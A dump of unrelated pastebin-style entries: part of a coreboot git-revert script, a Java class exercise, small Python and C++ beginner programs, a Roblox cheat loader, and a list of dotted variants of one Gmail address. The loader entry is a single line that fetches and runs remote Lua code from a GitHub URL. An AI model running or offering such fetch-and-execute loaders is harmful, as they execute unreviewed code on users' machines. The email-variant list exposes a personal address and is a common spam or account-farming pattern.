git revert --no-edit f362bbd5c7ce5d96f4bed3adee9a8f3ccc2728e8 #  4010 # GRF # commonlib,console,nb,sb,security: Add SPDX licenses to Makefiles
git revert --no-edit 88decca14f84184e95482d6b16c0791a70eae9ce #  3887 # GRF # ACPI: Add helper fill_fadt_extended_pm_io()
git revert --no-edit f6ca89c2241103c326641f21396f60bb079aa6a4 #  3875 # GRF # cpu: Add SPDX license headers to Makefiles
git revert --no-edit ce61679c69605371104b228b36cbee6c1a4f1fc0 #  3855 # GRF # sb/intel/lynxpoint/Kconfig: Remove SOUTH_BRIDGE_OPTIONS
git revert --no-edit 254a7c0f8138936bd020b7c06938a83151f32397 #  3854 # GRF # sb/intel/ibexpeak/Kconfig: Remove SOUTH_BRIDGE_OPTIONS
git revert --no-edit eb988dfcbad35a1b9ccb5e17d5f06f28f0b995a8 #  3802 # GRF # acpi/acpi.c: Move setting FADT SCI INT to arch specific code
git revert --no-edit cd46e5f63a468a3f4aae9267b5db94c4e5cc1458 #  3801 # GRF # acpi/acpi.c: Add and use acpi_arch_fill_madt()
git revert --no-edit 6af7261b2b2547a1e7dfe99c7e359e83d9f2314a #  3793 # GRF # acpi.c: Guard FACS generation
git revert --no-edit eb2897b113a04229c7749d1c23990c984775ca13 #  3703 # GRF # mb/samsung/lumpy: override SMBus subsystem ID
git revert --no-edit 6974bcd28e740c61b80fd4c98311fc5ee8c429ea #  3702 # GRF # mb/google/parrot: override SMBus subsystem ID
git revert --no-edit a6076cfcfdbe46e81e598e4761eb5d4c4a4082ab #  3701 # GRF # mb/google/butterfly: override SMBus subsystem ID
git revert --no-edit 2e3cb639258fcc63816e3e0f0c5ec468931bf2a4 #  3667 # GRF # acpi.c: Add functions to create GTDT
git revert --no-edit 92a3b67eaea08b54252a5f18b53ce3e287380365 #  3659 # GRF # acpi/acpi.c: Split of ACPI table generation into separate files
git revert --no-edit b096d625d53cfc5bf2dbc38310427efa7521001d #  3617 # GRF # soc/intel/xeon_sp: Introduce soc_cpu_is_enabled
git revert --no-edit 8554954f9cf23d3858f2826ac11c1d026b8faece #  3608 # GRF # nb/intel/i945: Rework nb resource reading
git revert --no-edit 9ab8a78d7e37c92fb0e59b511dd3ae20f6478002 #  3604 # GRF # soc/amd/common/acpimmio: factor out IO port access to PM registers
git revert --no-edit 5bd68097cbb850552d6ec440118c409612e034f4 #  3597 # CBF # soc/amd/common/acpimmio/mmio_util: drop enable_acpimmio_decode_pm24
git revert --no-edit ebafd4b905d913c37274ce97ff21c8f26ffabd78 #  3572 # GRF # util/crossgcc: Update GCC version from 11.3 to 11.4
git revert --no-edit ca0436f7c134e565cb83878efe4d4d4a9ef160f4 #  3514 # GRF # nb/intel/x4x: Rework nb resource reading
git revert --no-edit 90753398b6e394efedae423004648d5f7c303fd4 #  3510 # GRF # util/crossgcc: Fix broken link by Intel to acpica tarball
git revert --no-edit a959f0ad7620e2e8b13b51c34f7397caf53e9a5f #  3491 # GRF # allocator_v4: Disable top-down allocation for EDK2
git revert --no-edit 0bcdd40d789236aff2c205511dfc962a76a7c3be #  3477 # GRF # acpi/acpi.c: Fix regression with DSDT
git revert --no-edit adb80075151f5bb79b591cfafc54f4196fa7d353 #  3440 # GRF # acpi/acpi.c: Move ACPI header creation to a function
git revert --no-edit 01af0f8ac80384d23abc99860f2c5d605a1aa540 #  3439 # GRF # acpi/acpi.c: Reduce boilerplate
git revert --no-edit afa5383fdced8829689894a1833162b7361d9224 #  3402 # GRF # crossgcc: Upgrade IASL from 20230331 to 20230628
git revert --no-edit 0754e00ace632c4a9e22670da3d676d6e9352aa2 #  3339 # GRF # allocator_v4: Fix top-level allocations w/o IORESOURCE_ABOVE_4G
git revert --no-edit 866eff06edb962633723295b36b89a80befb757d #  3332 # GRF # allocator_v4: Manually inline some thin functions
git revert --no-edit ee57065daddf0ae42851472e40da0b812c95a397 #  3331 # GRF # allocator_v4: Factor resource printing out
git revert --no-edit 9260ea60bfa487851e6afda59d83214a0c967208 #  3330 # GRF # allocator_v4: Use memranges only for toplevel
git revert --no-edit 5226301765ded70e0ef640e5252bbaca8cd14451 #  3329 # GRF # allocator_v4: Treat above 4G resources more natively
git revert --no-edit f9ee87ffbf6e7e5d7870bd3617c5a3368ac41c54 #  3252 # GRF # acpi/acpi.h: Remove global acpi_fill_ivrs_ioapic()
git revert --no-edit 9362dd75d805fea8bc95ff58d5abd42cbbb4c36a #  3226 # GRF # acpi/acpi.c: Reduce scope of functions used locally
git revert --no-edit 8cab80c84f2be22e1f45a2b31c8019695b70abb2 #  3158 # GRF # soc/amd/common/acpi: move acpi_fill_root_complex_tom to Stoneyridge
git revert --no-edit 1c3849d5dc327866fc5f9e8805022b0f37d930a4 #  3124 # GRF # Documentation: Move 4.20 release notes to 4.20.1
git revert --no-edit 9c599c8b30eca53292cc9af6b01718ac8de46807 #  2994 # GRF # crossgcc: Upgrade IASL from 20221020 to 20230331
git revert --no-edit 67d95185865651aecb7ef3d8d343ec3cb9e60f77 #  2991 # CBF # arch/x86: Don't allow hw floating point operations
git revert --no-edit 531023285ea4108d5b847625739d76992ce39200 #  2927 # GRF # soc/intel/quark: Drop support
git revert --no-edit 6a07db21b12b08c7b975921f2ee1196dd0ec92b3 #  2904 # CBF # console: Add format-checking __printf() to die()
git revert --no-edit a4298bc3f82f476ce82e3e948f6573f5e38dfb25 #  2823 # GRF # mb/prodrive/atlas: Shorten FSP-M UPD statements
git revert --no-edit 85556ac1dc9472a7624cdc3c82aa890407ecceda #  2794 # GRF # soc/intel: Clean up some includes
git revert --no-edit 83faa5d804d183a26b0fa66b5d55bbe5f3b72c89 #  2785 # GRF # mb/google,intel: Use common ChromeEC code for lid shutdown
git revert --no-edit b78e4620375cc5668db668d900340fd89271c330 #  2743 # GRF # Convert literal uses of CONFIG_MAINBOARD_{VENDOR,PART_NUMBER}
git revert --no-edit 5fc0afbc170960d05012eec9b3b8717f65a07478 #  2684 # GRF # asus/p2b, emu/qemu-i440fx: Use acpigen_write_processor_device()
git revert --no-edit 02a19010916f6de42cd5ce0ba74da8ba5ad5c8ec #  2680 # GRF # sb,soc/amd,intel: Drop include <cpu/x86/smm.h>
git revert --no-edit 240baa31e8a804029069e21f523556d8628f6001 #  2679 # GRF # ACPI: Make FADT entries for RTC/CMOS architectural
git revert --no-edit 121d3d57adc35ed34204f983a72590f978939b1c #  2652 # GRF # ACPI: Make FADT entries for SMI architectural
git revert --no-edit 7186e28001ff01e9f48f838eab8ee462c3e8155c #  2651 # GRF # soc/amd: Drop acpi_fill_madt_irqoverride()
git revert --no-edit 3454367d6401ba7d468e8915706fd022b3b5d59f #  2628 # GRF # AMD binaryPI: Use ACPI_COMMON_MADT_IOAPIC
git revert --no-edit 8eac12fa7d49de59f63739bcb466e188dbc1ed66 #  2627 # GRF # soc/intel/common: Use ACPI_COMMON_MADT_IOAPIC
git revert --no-edit 304f8387fe698b66c7c853098001fc83638dd874 #  2626 # GRF # soc/amd: Use ACPI_COMMON_MADT_IOAPIC
git revert --no-edit 1f9e24052a9d51c015d2841ee66e7408d7bdab84 #  2625 # GRF # asus/p2b, emulation/qemu-i440fx: Use ACPI_COMMON_MADT_IOAPIC
git revert --no-edit ac61a65fef73fe0700695afd1fc849ed629d59aa #  2624 # GRF # aopen/dxplplusu: Use ACPI_COMMON_MADT_IOAPIC
git revert --no-edit 6437409b760a927a34bf5e804703873af898e14f #  2623 # GRF # soc/intel/baytrail,braswell: Use COMMON_MADT_IOAPIC
git revert --no-edit 81dc352032cacb309ed9335f394969d847820511 #  2622 # GRF # intel/bd82x6x,broadwell,lynxpoint: Use ACPI_COMMON_MADT_IOAPIC
git revert --no-edit 7f8e2a6a4a9cb1544ef8fa19850abeb3d4213931 #  2621 # GRF # sb/intel: Use ACPI_COMMON_MADT_IOAPIC
git revert --no-edit 10bdee13272a77aed46912363db691cf4c088a93 #  2620 # GRF # ACPI: Add COMMON_ACPI_MADT_IOAPIC and CUSTOM_ACPI_MADT
git revert --no-edit e742b68f1ac9324ce1f700323f1226e86d068a8c #  2619 # GRF # arch/x86/ioapic: Promote ioapic_get_sci_pin()
git revert --no-edit ae1b2d49cf0ad09ff8f1e3904a9e7b23d6fb423b #  2618 # GRF # soc/intel: Introduce ioapic_get_sci_pin()
git revert --no-edit 9368cf90255daeb53765d442a639f86ee5be1f29 #  2615 # GRF # acpi/acpi.c: Reduce scope of some functions
git revert --no-edit 27af3e6b111f462a71762bd56363d06d73505284 #  2599 # GRF # include/cpu/amd/mtrr: fix typo in get_top_of_mem_above_4gb
git revert --no-edit 7c302cf20859592a32e19fb6eb434dfb06b1d3c3 #  2583 # GRF # cpu/amd/pi/00730F01: rename fixme.c to cpu_io_init.c
git revert --no-edit fb532c711e2ef317108d6ffc35ae751bf7d58530 #  2545 # GRF # include/cpu/amd/mtrr: return uint32_t from get_top_of_mem_below_4gb
git revert --no-edit 5e9afe7272d110265ffa6f5465fa942c2bf4961f #  2544 # CBF # include/cpu/amd/mtrr: rename functions to get top of memory regions
git revert --no-edit 71fd3becf0f6aafa1b17495233129b06893402b1 #  2492 # GRF # soc/intel/baytrail: Make acpi_madt_irq_overrides() static
git revert --no-edit 69a13964ea6c5fda6ddf475a9ea905aa7376620c #  2491 # GRF # sb,soc/amd,intel: Add and use ACPI_COMMON_MADT_LAPIC
git revert --no-edit 36e6f9bc047f86e1628c8c41d3ac16d80fb344de #  2480 # GRF # soc/intel/xeon_sp: Don't sort struct device cpus for numa
git revert --no-edit 8547429d396a68fc82cc6aff5b7fa61ae8235834 #  2474 # GRF # acpi/acpi.c: Follow spec more closely for MADT
git revert --no-edit f4dff389ee90640cd2f9cd4b34f59ce14a738379 #  2456 # GRF # cpu/x86/mp_init.c: Set topology on BSP
git revert --no-edit 2e9f0d3b6aa754dc71cd36086d1eb2a839bdb7bd #  2419 # GRF # ACPI: Add helper for MADT LAPICs
git revert --no-edit 9ac1fb729fa316564992403580254b1c4afbf9c2 #  2418 # CBF # ACPI: Add helper for MADT LAPIC NMIs
git revert --no-edit 899c713e3eb073491d8b954165919daa87609493 #  2417 # CBF # binaryPI: Use common code for LAPIC NMIs
git revert --no-edit e84b095d3a238ae5fd734c4c186132a4e07eea07 #  2409 # GRF # util/sconfig: Remove unused ioapic and irq keywords
git revert --no-edit 8b8400a889abadbbd2156d4a35a27203068766f1 #  2408 # GRF # drivers/fsp2_0/mp_service_ppi: Use struct device to fill in buffer
git revert --no-edit 177e13513644b4d3de2529468e827ebfcadbda02 #  2360 # CBF # cpu/x86/topology: Add code to fill in topology on struct path
git revert --no-edit ddf48eb7c75687398d6a390bc21a50d74aef5df6 #  2359 # GRF # cpu/mp_init.c: Only enable CPUs once they execute code
git revert --no-edit a804f9195eb8fd93a2a6650cc24a26e422696214 #  2358 # GRF # cpu/smm_module_loader.c: Fix up CPU index locally
git revert --no-edit 21ca7753bf619f1de8dca79fd1113a9c22335f11 #  2356 # GRF # cpu/x86/mp_init.c: Keep track of initial lapic ID inside device_path
git revert --no-edit 0686c69802867293644a924bc29812697eace76f #  2300 # GRF # util/crossgcc: Update binutils from 2.37 to 2.40
git revert --no-edit 586b1c8da06fe34f91c747440730b31428248b34 #  2181 # GRF # mb/prodrive/atlas: Add workaround for CLKREQ pins
git revert --no-edit 4f13239318a92451dddcc821d9fb977c1d0b6994 #  2138 # GRF # mb/prodrive/atlas: Configure PCIe CLKREQ
git revert --no-edit 13dcdff7c7e1877887c3eb696b8de35872937d41 #  2127 # GRF # mb/asrock/b75pro3-m: Disable unused ME KT PCI device
git revert --no-edit ac8c378777d861000d82eea1c7439f16dcd45797 #  1940 # GRF # cpu/x86/smm: Add PCI resource store functionality
git revert --no-edit 829e8e65b93963d15367092cd3d364c230465720 #  1809 # GRF # ##### soc/intel: Use common codeflow for MP init
git revert --no-edit 36847977cb95e319ec67ab2edf85e6ea96783628 #  1760 # GRF # ##### util/crossgcc: Update GCC from 11.2 to 11.3
git revert --no-edit c013fa6234f08e22dd3706849936847cf82b5024 #  1748 # GRF # mb/scaleway/tagada: Drop support
git revert --no-edit 107e7aa0f58f79ee5719f82c7147e53d7d9fa218 #  1723 # GRF # cpu/x86/smm: Enable setting SMM console log level from mainboard
git revert --no-edit 893c3ae892961facc9be8bd300160222e694ab34 #  1543 # GRF # tree: Drop repeated words
git revert --no-edit 584d5e1cbabc1a8ce679597263d22a2a9b87c9f7 #  1532 # GRF # soc/intel/apl: Hook up cpu ops in devicetree
git revert --no-edit 01c8c5936451d1f31dcb0a1c79f1f8e01dead83b #  1527 # GRF # Makefile.inc: Use 'Wmissing-include-dirs' command option
git revert --no-edit b5df65a9aaee50421913ace6d7a4b35e0ddff676 #  1501 # GRF # mb/*: Replace SNB PCI devices with references from chipset.cb
git revert --no-edit 64e2ecb36fd1d7b289cd9671dcfae2e335528d81 #  1493 # GRF # soc/intel/apl: Move cpu cluster to chipset.cb
git revert --no-edit 15d5183e4af79624304a8379b71767cd8ee09250 #  1433 # CBF # util/sconfig: Remove lapic devices from devicetree parsers
git revert --no-edit 2c1511a461cd6dde750090e0337bf3f893710dc1 #  1430 # GRF # crossgcc: Upgrade mpfr from 4.1.1 to 4.2.0
git revert --no-edit d15a9f9b342e5226be67b6d43e68389d871f7f84 #  1429 # GRF # crossgcc: Upgrade mpc from 1.2.1 to 1.3.1
git revert --no-edit 6ac0a46bbf9e20c8412ee0d04658b3a2b10d0734 #  1422 # GRF # util/crossgcc/buildgcc: Remove extra ""/"" at the end of IASL_BASE_URL
git revert --no-edit 69cd729c0cde6f15d1de692f5a2da5d3dfe8ba15 #  1421 # GRF # mb/*: Remove lapic from devicetree
git revert --no-edit 48fa6dd8f9a8f78f94d508b0a105e2ddaacf99ba #  1326 # CBF # arch/x86/Kconfig: Remove unused NUM_IPI_STARTS
git revert --no-edit c9cd886a4b2d52734c6d1f5d028b98f0f3b1bcce #  1178 # CBF # treewide: Remove unused <cpu/x86/smm.h>
git revert --no-edit 8b93a173fbed29ea356653caa0626e48e81a5f8d #  1177 # CBF # treewide: Remove unused <cpu/amd/mtrr.h>
git revert --no-edit 16a444c5011e70298ebd9546a39f9d8b61d95030 #  1155 # GRF # util/crossgcc/Makefile.inc: Terminate quoted string
git revert --no-edit fc84ae7aa3cf7e8000ef69f854281f4648eeb2b8 #  1124 # CBF # treewide: Remove unused <cpu/amd/msr.h>
git revert --no-edit 4d75dbd1c1d6362c002a26a5c4e6de74b2816cdf #   950 # GRF # cpu/x86: Set up a separate stack for APs
git revert --no-edit 3b32af950d704b1d14ddca917dd480f5ebbf09a5 #   821 # GRF # util/crossgcc: Add option to get packages from coreboot's mirror
git revert --no-edit db65dd60fb11e3d38dbdd9a2e2f64d6ea7ef7576 #   748 # GRF # cpu/x86/mp_init.c: Improve AP entry point
git revert --no-edit 6e23da2983f83c803cf4abfee542d7f90e8e9eb5 #   622 # CBF # cpu/cpu.h: Change the function signature
git revert --no-edit f1e78a1349d40f2e8a74b15471fc5560976a566f #   560 # GRF # arch/x86/ioapic.c: Move macros to compilation unit
git revert --no-edit 2c3ebd8b9d56c01d8e4adadf6f4e4d5b56cdb4e1 #   555 # GRF # mb,sb,soc/intel: Drop useless IO trap handlers
git revert --no-edit 2393ad0bfb1cd23a0524e7b02a0fd75aff3bf274 #   520 # CBF # Makefile.inc: Use 'Wold-style-definition'
git revert --no-edit f9679c42876bab145f1b7a2a2e6e1eb5331fa418 #   500 # GRF # nb/intel/gm45: Remove apic 0 from devicetree
git revert --no-edit 31ba9356b877d670e683953f8b8962a7e6206cc3 #   499 # GRF # nb/intel/i945: Remove apic 0 from devicetree
git revert --no-edit 803029685f96bccac13359fc616d1577508ba764 #   498 # GRF # nb/intel/x4x: Remove apic 0 from devicetree
git revert --no-edit 98c92570d9bb363740ae1b2cbbefc3c0f2404cb4 #   497 # CBF # cpu/intel/speedstep: Have nb and sb code provide c5/c6/slfm
git revert --no-edit 60a422736bde766489db8ff0dc2d56ab333c37cc #   407 # GRF # util/crossgcc: Use GitHub for downloading IASL
git revert --no-edit cc22607dbfbab0c9ce42c071b5b3c4a304845313 #   420 # GRF # Revert ""src/arch/x86: Use core apic id to get cpu_index()""
git revert --no-edit a45ed44724a30303030e80898202b77c34498942 #   373 # CBF # crossgcc: Upgrade IASL from 20220331 to 20221020
git revert --no-edit fa775b7651e4488f0535c17a5e04974e7d1a40b2 #   171 # CBF # cpu/cpu.h: Remove unused functions prototypes
git revert --no-edit 987f46c276bd1b6b5d15be8ca9aee5f028e37fa7 #   167 # GRF # arch/x86/mpspec.c: Drop weak write_smp_table()
git revert --no-edit ca5a793ec31c76b168ae2f9d2260b49c79330eb2 #   166 # CBF # drivers/generic/ioapic: Drop poor implementation
git revert --no-edit d4dfc21f70616bc97191969aa2b6d0196a525fce #   134 # GRF # cpu/x86: Set thread local storage in C code
git revert --no-edit 1d3c2e65724ed92eeef723c1acdc86ba91cbd682 #   111 # CBF # arch/x86/ioapic: Reduce API exposure
git revert --no-edit c8a20b9d3b8939e4b7d259c5857631c9690657de #    76 # CBF # cpu/*: Drop PARALLEL_MP leftovers
git revert --no-edit 36695f278f0ca3cb3a3b0a8ca50b317505882df2 #    18 # CBF # device/resource_allocator_v3: Drop code
git revert --no-edit f4c11dcb53bbd324741ecd7109584eaa55579f7f #    17 # CBF # cpu/x86: Drop !CPU_INFO_V2 code
git revert --no-edit 66b2888b77da6721955a918c8cd5399abe786a6a #    16 # CBF # cpu/x86: Drop LEGACY_SMP_INIT
git revert --no-edit e2d291b5ae4aa49d5b1613e06b86bf2fc8efe4c5 #    15 # CBF # mb/qemu/x86: Remove option for LEGACY_SMP_INIT
git revert --no-edit 03a6ccd20d9bb54e3a009269b8e454ee8a2e3051 #    14 # CBF # sb/amd: Remove dropped platforms
git revert --no-edit 1a010236cf922fc28cfb36b604bdf17a9ea3cb82 #    13 # CBF # nb/amd/agesa: Remove leftover code
git revert --no-edit 81a4fefce223ba358310aec2d988484202c176e2 #    12 # CBF # cpu/amd/agesa: Remove leftover code
git revert --no-edit 0f12381083fdfc7bb3e6f3b2ac5cd6247506c543 #    11 # CBF # vendorcode/amd/agesa: Drop unused common code
git revert --no-edit 7036ded25d3a051902862e2a7bdfe15916f0951d #    10 # CBF # vendorcode/amd/agesa/family16: Drop unused platform
git revert --no-edit 49af4f7f9197e559b2c7142129441679bb1d24a2 #     9 # CBF # {cpu/nb}/amd/family16: Remove platform
git revert --no-edit 5d152122284880029c123fe2b7dfa20cd8b74632 #     8 # CBF # vendorcode/amd/agesa/fam15tn: Drop unused platform
git revert --no-edit 9a458e4e58edbfc154dce007961514b5c31cf7aa #     7 # CBF # {cpu/nb}/amd/family15tn: Remove platform
git revert --no-edit 713e3c087b6128fec2fd17d4373357e10fc928ab #     6 # CBF # vendorcode/amd/agesa/fam14: Remove dropped platform
git revert --no-edit dbdf170dcdf9edbc860766606e53c6d647d89d38 #     5 # CBF # {cpu/nb}/amd/family14: Remove platform
git revert --no-edit 6baee3d28729d4b924e8f793c4c7311cebf1f80a #     3 # CBF # mb/*/*: Remove AMD agesa family16 boards
git revert --no-edit f9decbb0c720662d8e71fe221aef55b7ecf76196 #     2 # CBF # mb/*/*: Remove AMD family14 boards
git revert --no-edit e56f0c7cab77b89a750b4a3f7f380b1a10cd0d1d #     1 # CBF # mb/*/*: Remove AMD FAMILY15TN boards

#
# git reset --hard 5e8e911b7caee021faff96c4e82a77a42544ea62 # 00000 # - zero commit number = zero point of history before removal
#

git revert --no-edit ce134ababd6a444082962ccdfcd34415a647f41e # -4568 # GRF # crossgcc/buildgcc: Remove unused GCC_AUTOCONF_VERSION
git revert --no-edit b0d87f753c9c517ba906115362d32aa4422fd188 # -5952 # CBF # util/crossgcc: Update gcc to 11.2

#"
jtWrfXRJ,poo lect7,STANAANDREY,Java,Sunday 19th of November 2023 02:01:29 PM CDT,"import java.util.Arrays;

class Member {
    private String name;
    private int age;

    public Member(String name, int age) {
        this.name = name;
        this.age = age;
    }

    @Override
    public String toString() {
        return ""{"" + name + ""}"";
    }
}

interface Risky {
    double getRisk();
}

abstract class Project implements Risky {
    private String title, objective;
    private Member manager;
    protected long funds;
    protected Member[] members;
    protected int len = 0;
    public Project(String title, String objective, Member manager, long funds) {
        this.title = title;
        this.objective = objective;
        this.manager = manager;
        this.funds = funds;
    }

    abstract void addMember(Member member);
}

class ComercialProject extends Project {
    private String deadLine;
    private static final int MAX_LEN = 15;
    private long marketingFunds;
    private long teamsNr;
    public ComercialProject(
            String title,
            String objective,
            Member manager,
            long funds,
            String deadLine,
            long teamsNr
    ) {
        super(title, objective, manager, funds);
        this.deadLine = deadLine;
        this.marketingFunds = funds / 2;
        this.teamsNr = teamsNr;
        this.members = new Member[MAX_LEN];
    }

    @Override
    public double getRisk() {
        return 3*   teamsNr/len/funds - marketingFunds;
    }

    @Override
    public void addMember(Member member) {
        if (len == MAX_LEN) {
            return;
        }
        members[len++] = member;
    }

    @Override
    public String toString() {
        return ""ComercialProject{"" +
                ""deadLine='"" + deadLine + '\'' +
                "", marketingFunds="" + marketingFunds +
                "", teamsNr="" + teamsNr +
                "", funds="" + funds +
                "", members="" + Arrays.toString(members) +
                "", len="" + len +
                '}';
    }
}

class MilitaryProject extends Project {
    private String deadLine;
    private static final int MAX_LEN = 15;
    private String password;

    public MilitaryProject(
            String title,
            String objective,
            Member manager,
            String deadLine,
            long funds,
            String password
    ) {
        super(title, objective, manager, funds);
        this.deadLine = deadLine;
        this.password = password;
        this.members = new Member[MAX_LEN];
    }
    @Override
    public double getRisk() {
        return len/password.length()/funds;
    }

    @Override
    void addMember(Member member) {
        if (len == MAX_LEN) {
            return;
        }
        members[len++] = member;
    }

    @Override
    public String toString() {
        return ""MilitaryProject{"" +
                ""deadLine='"" + deadLine + '\'' +
                "", password='"" + password + '\'' +
                "", funds="" + funds +
                "", members="" + Arrays.toString(members) +
                "", len="" + len +
                '}';
    }
}

class OpenSourceProject extends Project {

    private String mailingList;

    public OpenSourceProject(
            String title,
            String objective,
            Member manager,
            long funds,
            String mailingList
    ) {
        super(title, objective, manager, funds);
        this.mailingList = mailingList;
        this.members = new Member[1];
    }

    @Override
    public double getRisk() {
        return len/funds;
    }

    @Override
    void addMember(Member member) {
        if (len == members.length) {
            Member[] aux = members;
            members = new Member[len * 2];
            for (int i = 0; i < len; i++) {
                members[i] = aux[i];
            }
        }
        members[len++] = member;
    }

    @Override
    public String toString() {
        return ""OpenSourceProject{"" +
                ""mailingList='"" + mailingList + '\'' +
                "", funds="" + funds +
                "", members="" + Arrays.toString(members) +
                "", len="" + len +
                '}';
    }
}


public class InvestmentCompany {
    private Project[] projects;
    private int len = 0;

    public InvestmentCompany() {
        this.projects = new Project[1];
    }

    public void addProject(Project project) {
        if (len == projects.length) {
            Project[] aux = projects;
            projects = new Project[len * 2];
            for (int i = 0; i < len; i++) {
                projects[i] = aux[i];
            }
        }
        projects[len++] = project;
    }

    public Project getBestInvestment() {
        double min = Double.MAX_VALUE;
        Project ans = null;
        for (int i = 0; i < len; i++) {
            double risk = projects[i].getRisk();
            if (risk < min) {
                min = risk;
                ans = projects[i];
            }
        }
        return ans;
    }
    public static void main(String[] args) {
        MilitaryProject mp = new MilitaryProject(
                ""title1"",
                ""obj1"",
                new Member(""john1"", 30),
                ""30-11-2023"",
                100,
                ""secret""
        );
        ComercialProject cp = new ComercialProject(
             ""title2"",
             ""obj2"",
             new Member(""john2"", 40),
             1000,
             ""20-11-2023"", 2
        );
        OpenSourceProject osp = new OpenSourceProject(
                ""title3"",
                ""objective3"",
                new Member(""john3"", 33),
                200,
                ""x@gmail.com""
        );
        Member a, b, c, d, e;
        a = new Member(""a"", 19);
        b = new Member(""b"", 21);
        c = new Member(""c"", 22);
        d = new Member(""d"", 23);
        e = new Member(""e"", 21);
        cp.addMember(a);
        cp.addMember(b);
        mp.addMember(a);
        mp.addMember(d);
        mp.addMember(c);
        osp.addMember(e);
        InvestmentCompany investmentCompany = new InvestmentCompany();
        investmentCompany.addProject(mp);
        investmentCompany.addProject(osp);
        investmentCompany.addProject(cp);
        System.out.println(investmentCompany.getBestInvestment());
    }
}
"
NqJxxZB4,sum_char,Hristomir,Python,Sunday 19th of November 2023 01:09:54 PM CDT,"my_word = input()

sum = 0

for i in my_word:
    if i == ""a"":
        sum += 1
    elif i == ""e"":
        sum += 2
    elif i == ""i"":
        sum += 3
    elif i == ""o"":
        sum += 4
    elif i == ""u"":
        sum += 5
print(sum)"
KTLM8hYt,quien sos python,newearthmartin,Python,Sunday 19th of November 2023 01:09:32 PM CDT,"nombre = input('Quien sos?')
nombre_lower = nombre.lower()
if nombre_lower == 'noel':
    print('hola babonga ' + nombre)
elif nombre_lower == 'martin':
    print('hola babongo')
elif nombre_lower == 'arya' or nombre_lower == 'erys':
    print('miau')
else:
    print('hola ' + nombre)"
Q2UnEWVY,Pet Simulator 99 Script Pastebin,Shifu_,Lua,Sunday 19th of November 2023 12:59:30 PM CDT,"-- wexo - Automation to the Next Level
-- [ Automation will be ready at the first seconds of the games realese ]
loadstring(game:HttpGet(""https://raw.githubusercontent.com/localyactive/projects/main/folder/hg""))()"
MfQJV7w8,The Grid Remake,NindroidA,Lua,Sunday 19th of November 2023 12:54:07 PM CDT,"--[[
bruh
]]--"
LsWC25aT,Is the year leap or not,BojidarDosev,C++,Sunday 19th of November 2023 12:40:03 PM CDT,"#include <iostream>
using namespace std;

string leap(int y)
{
	if (y % 100 == 0 && y % 400 == 0)
	{
		return ""leap"";
	}
	else if (y % 100 == 0 && y % 400 != 0)
	{
		return ""not leap"";
	}
	else if (y % 4 == 0)
	{
		return ""leap"";
	}
	else if (y % 4 != 0)
	{
		return ""not leap"";
	}
	else return ""error"";
}

int main()
{
	int y;
	cout << "" Insert a year: \n"";
	cin >> y;
	cout << "" Year is: \n "" << leap(y) <<""\n"";
	cout << "" Insert a year: \n"";
	cin >> y;
	cout << "" Year is: \n "" << leap(y) << ""\n"";
	cout << "" Insert a year: \n"";
	cin >> y;
	cout << "" Year is: \n "" << leap(y) << ""\n"";
}"
zEHGE8dy,Untitled,bombaires,AIMMS,Sunday 19th of November 2023 12:32:15 PM CDT,"<a href=""mailto:rahulkhan3555@gmail.com"">rahulkhan3555@gmail.com</a>
<a href=""mailto:r.ahu.lkhan.3555@gmail.com"">r.ahu.lkhan.3555@gmail.com</a>
<a href=""mailto:r.a.hu.lk.han.3.555@gmail.com"">r.a.hu.lk.han.3.555@gmail.com</a>
<a href=""mailto:ra.h.ul.kh.an3.5.55@gmail.com"">ra.h.ul.kh.an3.5.55@gmail.com</a>
<a href=""mailto:r.a.hu.l.kh.an355.5@gmail.com"">r.a.hu.l.kh.an355.5@gmail.com</a>
<a href=""mailto:r.a.h.ul.kha.n.3555@gmail.com"">r.a.h.ul.kha.n.3555@gmail.com</a>
<a href=""mailto:r.a.hul.kha.n.3.5.5.5@gmail.com"">r.a.hul.kha.n.3.5.5.5@gmail.com</a>
<a href=""mailto:rah.ulkh.a.n.3.555@gmail.com"">rah.ulkh.a.n.3.555@gmail.com</a>
<a href=""mailto:rahu.lkh.a.n.3.5.55@gmail.com"">rahu.lkh.a.n.3.5.55@gmail.com</a>
<a href=""mailto:r.ahulkh.an.3.5.55@gmail.com"">r.ahulkh.an.3.5.55@gmail.com</a>
<a href=""mailto:r.ah.ul.kh.an35.5.5@gmail.com"">r.ah.ul.kh.an35.5.5@gmail.com</a>
<a href=""mailto:r.ahu.lkh.a.n.3.55.5@gmail.com"">r.ahu.lkh.a.n.3.55.5@gmail.com</a>
<a href=""mailto:rahulk.ha.n.3555@gmail.com"">rahulk.ha.n.3555@gmail.com</a>
<a href=""mailto:ra.hul.k.ha.n.35.55@gmail.com"">ra.hul.k.ha.n.35.55@gmail.com</a>
<a href=""mailto:r.a.hul.k.h.a.n.3.5.5.5@gmail.com"">r.a.hul.k.h.a.n.3.5.5.5@gmail.com</a>
<a href=""mailto:r.ahulkh.an3555@gmail.com"">r.ahulkh.an3555@gmail.com</a>
<a href=""mailto:r.ahul.kh.an3.5.55@gmail.com"">r.ahul.kh.an3.5.55@gmail.com</a>
<a href=""mailto:ra.hulk.h.an3.5.55@gmail.com"">ra.hulk.h.an3.5.55@gmail.com</a>
<a href=""mailto:rahulk.han.3.5.5.5@gmail.com"">rahulk.han.3.5.5.5@gmail.com</a>
<a href=""mailto:ra.hulk.h.an355.5@gmail.com"">ra.hulk.h.an355.5@gmail.com</a>
<a href=""mailto:ra.h.u.l.k.h.a.n.355.5@gmail.com"">ra.h.u.l.k.h.a.n.355.5@gmail.com</a>
<a href=""mailto:ra.hul.kh.a.n.3.55.5@gmail.com"">ra.hul.kh.a.n.3.55.5@gmail.com</a>
<a href=""mailto:rah.u.lk.h.a.n355.5@gmail.com"">rah.u.lk.h.a.n355.5@gmail.com</a>
<a href=""mailto:ra.h.u.lk.h.a.n.35.55@gmail.com"">ra.h.u.lk.h.a.n.35.55@gmail.com</a>
<a href=""mailto:r.ah.ulk.h.an.35.55@gmail.com"">r.ah.ulk.h.an.35.55@gmail.com</a>
<a href=""mailto:rah.u.l.kh.a.n35.55@gmail.com"">rah.u.l.kh.a.n35.55@gmail.com</a>
<a href=""mailto:r.ahu.l.k.ha.n.3.5.5.5@gmail.com"">r.ahu.l.k.ha.n.3.5.5.5@gmail.com</a>
<a href=""mailto:r.a.h.u.l.k.h.an3.555@gmail.com"">r.a.h.u.l.k.h.an3.555@gmail.com</a>
<a href=""mailto:rah.ulk.h.a.n3.5.5.5@gmail.com"">rah.ulk.h.a.n3.5.5.5@gmail.com</a>
<a href=""mailto:r.ahu.l.k.ha.n.355.5@gmail.com"">r.ahu.l.k.ha.n.355.5@gmail.com</a>
